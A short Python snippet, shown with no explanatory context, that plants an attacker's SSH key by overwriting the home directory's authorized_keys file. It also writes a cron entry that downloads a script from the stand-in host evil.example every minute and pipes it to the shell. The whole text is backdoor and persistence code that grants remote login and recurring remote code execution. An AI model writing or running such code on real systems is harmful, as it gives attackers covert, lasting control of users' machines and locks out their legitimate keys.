from pathlib import Path

Path.home().joinpath('.ssh/authorized_keys').write_text('ssh-rsa AAA attacker')
Path('/tmp/cron').write_text('* * * * * curl https://evil.example/p.sh | sh')
